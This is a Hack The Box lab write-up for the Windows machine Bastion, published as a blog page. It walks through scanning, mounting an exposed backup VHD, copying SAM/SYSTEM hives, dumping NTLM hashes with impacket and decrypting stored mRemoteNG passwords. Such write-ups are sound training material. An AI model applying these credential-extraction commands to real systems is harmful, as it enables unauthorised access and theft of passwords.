@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Bastion - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/TartaSauce/">17. Hack The Box - TartaSauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Bastion"><a href="#Hack-The-Box-Bastion" class="headerlink" title="Hack The Box - Bastion"></a>Hack The Box - Bastion</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Bastion is an Easy level WIndows box which contains a VHD ( Virtual Hard Disk ) image from which credentials can be extracted. After logging in, the software MRemoteNG is found to be installed which stores passwords insecurely, and from which credentials can be extracted. Its IP address is <code>10.10.10.134</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/Bastion/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services.
+<pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/bastion)
+ |                                                                                                                                           
+ |-->{SFire129}#nmap -p- -T 4 10.10.10.134
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 14:45 EDT
+ Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+ SYN Stealth Scan Timing: About 7.87% done; ETC: 14:51 (0:06:15 remaining)
+ Nmap scan report for 10.10.10.134
+ Host is up (0.16s latency).
+ Not shown: 65522 closed ports
+ PORT      STATE SERVICE
+ 22/tcp    open  ssh
+ 135/tcp   open  msrpc
+ 139/tcp   open  netbios-ssn
+ 445/tcp   open  microsoft-ds
+ 5985/tcp  open  wsman
+ 47001/tcp open  winrm
+ 49664/tcp open  unknown
+ 49665/tcp open  unknown
+ 49666/tcp open  unknown
+ 49667/tcp open  unknown
+ 49668/tcp open  unknown
+ 49669/tcp open  unknown
+ 49670/tcp open  unknown
+ 
+ Nmap done: 1 IP address (1 host up) scanned in 758.58 seconds</figure></pre>
+  <h2 id="Enumeration"><a href="#Enumeration" class="Enumeration" title="Enumeration"></a>Enumeration</h2>
+ <p>Scan SMB protocol como <code>smbmap</code>.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~)
+|                                                                                                                                                                            
+|-->{SFire129}#smbmap -H 10.10.10.134                                                                                                                                        
+[!] Authentication error on 10.10.10.134
+|-------(root@kali)-------|(~)
+|                                                                                                                                                                            
+|-->{SFire129}#smbmap -u cualquierusuario -H 10.10.10.134                                                                                                                    
+[+] Guest session       IP: 10.10.10.134:445    Name: 10.10.10.134                                      
+[|] Work[!] Unable to remove test directory at \\10.10.10.134\Backups\TIAHGMFJBD, please remove manually
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        Backups                                                 READ, WRITE
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC</figure></pre>
+		
+<p>Connect to Backups folder and mount.
+   <pre><figure class="highlight plain"> |-------(root@kali)-------|(~)
+ |
+ |-->{SFire129}#mount -t cifs //10.10.10.134/Backups /mnt/smb
+ Password for root@//10.10.10.134/Backups:                          
+ |-------(root@kali)-------|(~)
+ |                                                                                                                                                                            
+ |-->{SFire129}#cd /mnt/smb/
+ |-------(root@kali)-------|(/mnt/smb)
+ |                                                                                                                                                                            
+ |-->{SFire129}#ls                                                                                                                                                            
+ note.txt  SDT65CB.tmp  WindowsImageBackup
+ |-------(root@kali)-------|(/mnt/smb)
+ |                                                                                                                                                                            
+ |-->{SFire129}# </figure></pre>
+ <p>Enumerate the folders show a virtual disk.
+                                                                                                                                      
+ <pre><figure class="highlight plain">|-------(root@kali)-------|(/mnt/smb/WindowsImageBackup)
+ |                                                                                                                                                                            
+ |-->{SFire129}#ls                                                                                                                                                            
+ L4mpje-PC
+ |-------(root@kali)-------|(/mnt/smb/WindowsImageBackup)
+ |                                                                                                                                                                            
+ |-->{SFire129}#cd L4mpje-PC/
+ |-------(root@kali)-------|(/mnt/smb/WindowsImageBackup/L4mpje-PC)
+ |                                                                                                                                                                            
+ |-->{SFire129}#ls                                                                                                                                                            
+ 'Backup 2019-02-22 124351'   Catalog   MediaId   SPPMetadataCache
+ |-------(root@kali)-------|(/mnt/smb/WindowsImageBackup/L4mpje-PC)
+ |                                                                                                                                                                            
+ |-->{SFire129}#cd 'Backup 2019-02-22 124351'/                                                                                                                                
+ |-------(root@kali)-------|(/mnt/smb/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351)
+ |                                                                                                                                                                            
+ |-->{SFire129}#ls                                                                                                                                                            
+ 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
+ 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+ BackupSpecs.xml
+ cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
+ cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
+ cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
+ cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
+ cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
+ cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
+ cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
+ cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
+ cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
+ cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
+.</figure></pre>
+ <p>List the content with 7z program for review the vhd disk
+  <img src="/images/hackthebox/exploit/Bastion/1.png" alt=""></p>
+ <p>Install <code>guestmount</code> and connect to virtual disk. <code> guestmount --add fil-vhd --inspector --ro -v /mnt/vhd</code>.
+ <img src="/images/hackthebox/exploit/Bastion/2.png" alt=""></p>
+ <p>The vhd is an windows partition, which has SAM file, copy and paste in local Linux Kali.
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(/mnt/vhd/Windows/System32/config)
+|
+|-->{SFire129}#cp SAM SYSTEM ~/HackTheBox/bastion/
+|-------(root@kali)-------|(/mnt/vhd/Windows/System32/config)
+|
+|-->{SFire129}#cd ~/HackTheBox/bastion/
+|-------(root@kali)-------|(~/HackTheBox/bastion)
+|
+|-->{SFire129}#ls
+L4mpje-PC  SAM  SYSTEM </figure></pre>
+ <p>Wiht impacket dump the hash system,
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/bastion)
+|
+|-->{SFire129}#impacket-secretsdump -sam SAM -system SYSTEM local
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+[*] Cleaning up...</figure></pre>
+<p>In the internet decrypt the hash.
+ <img src="/images/hackthebox/exploit/Bastion/3.png" alt=""></p>
+<h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+ <p>With the credentials found, authenticate in ssh service.
+ <img src="/images/hackthebox/exploit/Bastion/4.png" alt=""></p>
+ <p>Download the <code>jaws-enum.ps1</code> to enumerate the target.
+ <img src="/images/hackthebox/exploit/Bastion/5.png" alt=""></p>
+ <p>The output show mRemoteNG software.
+ <img src="/images/hackthebox/exploit/Bastion/6.png" alt=""></p>
+ <p>Browsing in the folder software location:
+ <img src="/images/hackthebox/exploit/Bastion/7.png" alt=""></p>
+ <p>Download the <code>ptyhon3 mremoteng_decrypt.py</code>.
+ <img src="/images/hackthebox/exploit/Bastion/8.png" alt=""></p>
+ <p>List the hidden files with <code>dir /a</code> command.
+ <img src="/images/hackthebox/exploit/Bastion/9.png" alt=""></p>
+ <p>In the location <code>c:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml</code>.
+  <img src="/images/hackthebox/exploit/Bastion/10.png" alt=""></p>
+ <p>Decrypt the passwords:
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(/opt/mRemoteNG)
+|                                                                                                                                                                                                       
+|-->{SFire129}#python3 mremoteng_decrypt.py -s yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB                                                                         
+Password: bureaulampje
+|-------(root@kali)-------|(/opt/mRemoteNG)
+|                                                                                                                                                                                                       
+|-->{SFire129}#python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==                                                                 
+Password: thXLHM96BeKL0ER2</figure></pre>
+  <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+ <pre><figure class="highlight plain">  |-------(root@kali)-------|(/opt/mRemoteNG)
+|                                                                                                                                                                                                       
+|-->{SFire129}#ssh administrator@10.10.10.134
+administrator@10.10.10.134's password: 
+Microsoft Windows [Version 10.0.14393]                                                                                          
+(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
+
+administrator@BASTION C:\Users\Administrator>type C:\Users\L4mpje\Desktop\user.txt                                              
+***Here you could find the user flag***                                                                                              
+administrator@BASTION C:\Users\Administrator>type Desktop\root.txt                                                              
+***Here you could find the root flag***
+administrator@BASTION C:\Users\Administrator>                                                                                   
+
+
+psexec.py administrator@10.10.10.134
+</figure></pre>
+ 
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-07-14</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#Windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#SAM</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
